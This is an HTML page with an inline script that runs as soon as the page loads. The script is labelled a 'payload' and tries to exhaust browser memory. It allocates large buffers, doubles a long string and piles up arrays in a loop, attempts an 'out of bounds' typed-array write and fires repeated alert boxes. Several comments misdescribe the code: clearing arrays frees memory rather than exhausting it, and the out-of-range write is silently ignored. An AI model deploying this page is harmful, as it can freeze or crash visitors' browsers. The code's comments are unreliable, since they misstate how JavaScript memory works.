<!DOCTYPE html>
<html lang="en">
<head></head>
<body>

<script>
alert("Start?");

function memExh() {
    let bufferArray = [];
    for (let i = 0; i < 8192; i++) {
        bufferArray.push(new ArrayBuffer(1000000)); // Allocate large buffers
        if (bufferArray.length > 1000) {
            bufferArray = []; // Clear buffer array to exhaust memory
        }
    }
}

function payload() {
    let largeString = "A".repeat(1000000); // 1 million A's
    let nestedArray = [];
    let iterationCount = 0; // Counter to track number of iterations

    while (true) {
        // String concatenation
        largeString += largeString;
        if (largeString.length > 100000000) {
            largeString = "A".repeat(1000000); // Reset string to avoid overflow
        }

        memExh(); // Exhaust memory

        // Nested arrays
        nestedArray.push([]);
        if (nestedArray.length > 1000) {
            nestedArray = []; // Clear nested arrays to exhaust memory
        }

        // Attempt to write to memory
        try {
            let buffer = new ArrayBuffer(10); // Create a small buffer
            let view = new Uint8Array(buffer);
            view[11] = 255; // Attempt to write out of bounds
            alert("Memory write success at iteration " + iterationCount);
        } catch (e) {
            alert("Memory write failed at iteration " + iterationCount + ": " + e.message);
        }

        iterationCount++;
        if (iterationCount >= 100) {
            break;
        }
    }
}

payload(); // This is the most important part of the function without which nothing works
</script>
</body>
</html>
